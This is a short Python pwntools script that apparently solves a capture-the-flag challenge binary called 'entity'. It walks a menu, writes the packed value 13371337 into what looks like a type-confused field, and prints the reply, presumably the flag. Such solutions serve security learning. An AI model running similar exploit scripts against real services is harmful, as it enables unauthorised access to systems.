#!/usr/bin/env python3

from pwn import context, p64, remote, sys

context.binary = 'entity'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'>> ', b'T')
    p.sendlineafter(b'>> ', b'S')
    p.sendlineafter(b'>> ', p64(13371337))
    p.sendlineafter(b'>> ', b'C')
    print(p.recvline().decode())
    p.close()


if __name__ == '__main__':
    main()
